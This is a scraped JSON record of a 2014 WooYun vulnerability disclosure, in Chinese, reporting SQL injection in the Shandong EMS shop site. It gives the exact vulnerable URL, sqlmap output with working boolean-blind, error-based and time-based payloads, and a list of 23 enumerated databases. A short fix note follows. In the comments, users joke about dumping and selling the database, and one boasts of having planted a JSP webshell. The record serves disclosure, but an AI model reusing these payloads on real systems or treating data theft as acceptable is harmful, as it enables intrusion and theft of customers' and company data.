{"id": 770, "wybug_id": "wooyun-2014-074081", "wybug_title": "山东ems整站数据库沦陷（不知道有几千张表）", "wybug_corp": "中国邮政集团公司信息技术局", "wybug_author": "路人甲", "wybug_date": "2014-08-27 17:23", "wybug_open_date": "2014-10-11 17:24", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "19", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-11：\t细节向公众公开  简要描述： 一个注入点，注出了山东ems全站数据库。23个库，随便点了个库，393张表，太多敏感信息。 详细说明：  1.注入点：http://www.sdems.com.cn/shop/ordershop.asp?id=20104774444030&orderid=1 (GET)2.payload\nsqlmap identified the following injection points with a total of 54 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=20104774444030%' AND 5635=5635 AND '%'='&orderid=1    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=20104774444030%' AND 5564=CONVERT(INT,(SELECT CHAR(113)+CHAR(101)+CHAR(121)+CHAR(99)+CHAR(113)+(SELECT (CASE WHEN (5564=5564) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(117)+CHAR(100)+CHAR(111)+CHAR(113))) AND '%'='&orderid=1    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: id=20104774444030%' AND 6250=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND '%'='&orderid=1---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005\n3.库：团购。公司OA。ERP。海尔ERP。太多敏感库了available databases [23]:[*] DianCMS[*] EMS_ERPbate[*] ems_OA[*] EMSERP[*] EMSERP_0106[*] EMSERP_0501[*] EMSERP_07161[*] EMSERP_1223[*] EMSERP_830[*] EMSERP_910[*] EMSERPNEAR[*] emstuan[*] HaierERP[*] INGNET_TCG[*] INGNETERP  [*] master[*] model[*] msdb[*] tempdb[*] TUAN39[*] tuangou[*] WJM[*] WJM_EN表太多了，跑的话时间太长，仅截一个库的图做证明。\n\n   漏洞证明：  1.注入点：http://www.sdems.com.cn/shop/ordershop.asp?id=20104774444030&orderid=1 (GET)2.库：团购。公司OA。ERP。海尔ERP。太多敏感库了available databases [23]:[*] DianCMS[*] EMS_ERPbate[*] ems_OA[*] EMSERP[*] EMSERP_0106[*] EMSERP_0501[*] EMSERP_07161[*] EMSERP_1223[*] EMSERP_830[*] EMSERP_910[*] EMSERPNEAR[*] emstuan[*] HaierERP[*] INGNET_TCG[*] INGNETERP  [*] master[*] model[*] msdb[*] tempdb[*] TUAN39[*] tuangou[*] WJM[*] WJM_EN表太多了，跑的话时间太长，仅截一个库的图做证明。\n\n   修复方案：  首先，sql注入，过滤，大家都知道。再次，各个网站的数据库都在一起的话，最好站库分离，确保数据库安全,不然一个小漏洞会导致大问题。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-08-29 13:29 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-27 21:03 |    \t\t野狼 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | CcAv TeAm成员，CCAV11站长，白帽子。)\t\t \n  嘻嘻，前几天央视报道了个拖顺丰数据库的，要不你拖EMS的数据库卖卖、    \n     2014-08-27 21:06 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  那就作大新闻了    \n     2014-08-29 11:03 |    \t\tJuly \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:8        | 红星闪闪)\t\t \n  两年前,这个网站搞得都不搞了,自从脱裤后,管理员就把我的JSP马删了,删了。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}